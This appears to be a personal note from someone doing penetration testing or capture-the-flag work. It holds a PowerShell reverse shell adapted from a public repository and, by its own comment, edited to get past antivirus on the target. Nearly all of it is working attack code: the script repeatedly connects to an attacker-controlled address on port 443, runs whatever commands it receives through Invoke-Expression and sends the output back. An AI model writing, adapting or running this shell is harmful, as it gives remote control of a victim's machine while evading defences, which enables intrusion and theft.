# cred to the releaser of this repo i have edited a few lines to work around the AV on the box
+ https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1

# prep shell
nano get.ps1
do {
    Start-Sleep -Seconds 15

    
    try{
        $TCPClient = New-Object Net.Sockets.TCPClient('VPNIPHERE', 443)
    } catch {}
} until ($TCPClient.Connected)

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)


function WriteToStream ($String) {
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}

    
    $StreamWriter.Write($String + 'BADCMD> ')
    $StreamWriter.Flush()
}


WriteToStream ''


while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    # Encode command, remove last byte/newline
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    
    # Execute command and save output (including errors thrown)
    $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }

    
    WriteToStream ($Output)
}
$StreamWriter.Close()
